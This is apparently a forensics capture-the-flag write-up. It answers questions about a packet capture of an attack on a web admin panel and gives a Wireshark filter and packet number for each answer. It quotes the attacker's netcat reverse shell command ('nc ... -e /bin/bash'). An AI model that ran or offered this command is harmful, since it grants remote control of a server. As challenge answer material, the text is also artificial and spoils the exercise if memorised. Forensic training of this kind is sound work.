1. What is the CSRF token value for the first login request?
2. What is the password of the first user who logged in?

http.request.method == "POST" && http.request.uri contains "login"
-> see the csrf detail in "HTML form url encoded"

3. What is the 1st username that was created by the attacker?
4. What is the username that the attacker used to login to the admin panel?

http && ip.src == 192.168.18.160 
=> packet 9920 contain username ("3536rr") were created 
=> packet 10003 were login with user "a7zo4l" were created

5. What is the name of the plugin that the attacker uploaded?

http.request.method ==POST && ip.src == 192.168.18.160
-> see packet 10158 and see filename in packet detail

6. What is the first command that the user executed?
7. Which tool did the attacker use to get a reverse shell?

-> packet 10246 and see command "whoami"
-> packet 10291 and see "nc 192.168.18.160 8888 -e /bin/bash"

8. Which command did the attacker execute on the server to check for network interfaces?

-> Click TCP stream in packet 10211 to begin investigate. In stream "1192" , see all command were run after hacker connect to server by revershell -> ifconfig

